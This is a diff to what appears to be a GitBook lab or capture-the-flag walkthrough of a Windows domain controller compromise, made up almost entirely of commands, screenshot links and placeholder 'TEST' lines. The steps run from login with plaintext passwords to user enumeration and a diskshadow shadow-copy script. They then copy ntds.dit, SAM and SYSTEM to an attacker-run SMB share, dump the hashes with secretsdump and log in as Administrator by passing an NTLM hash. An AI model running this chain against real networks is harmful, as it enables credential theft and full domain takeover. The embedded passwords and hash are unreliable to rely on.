@@ -100,3 +100,153 @@ evil-winrm -i 10.49.174.246 -u 'lparker' -p '!!abbylvzsvs2k6!'
 
 <figure><img src="../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>
 
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+crackmapexec smb 10.48.139.33 -u 'lparker' -p '!!abbylvzsvs2k6!' --users
+```
+{% endcode %}
+
+TEST
+
+<figure><img src="../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+evil-winrm -i 10.48.139.33 -u 'jmurphy' -p 'u8WC3!kLsgw=#bRY'
+```
+{% endcode %}
+
+TEST
+
+<figure><img src="../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+whoami /priv
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>
+
+TEST
+
+create a file called viper.dsh
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+set context persistent nowriters
+add volume c: alias viper
+create
+expose %viper% X:
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>
+
+Then
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+unix2dos viper.dsh
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>
+
+Go in the&#x20;
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+cd /windows/tasks
+```
+{% endcode %}
+
+Upload The File in evil-winrm
+
+<figure><img src="../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+diskshadow /s viper.dsh
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+robocopy /b X:\Windows\NTDS . ntds.dit
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+reg save HKLM\SYSTEM C:\windows\tasks\system
+```
+{% endcode %}
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+reg save HKLM\SAM C:\windows\tasks\sam
+```
+{% endcode %}
+
+TEST
+
+<figure><img src="../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>
+
+TESSST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+impacket-smbserver kali . -smb2support -username kali -password kali
+```
+{% endcode %}
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+net use \192.168.130.53\kali /user:kali kali
+```
+{% endcode %}
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+copy sam, system, ntds.dit \192.168.130.53\kali
+```
+{% endcode %}
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
+```
+{% endcode %}
+
+TEST
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+evil-winrm -i 10.48.139.33 -u 'Administrator' -H 9653b02d945329c7270525c4c2a69c67
+```
+{% endcode %}
+
+TEST
+
+<figure><img src="../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>
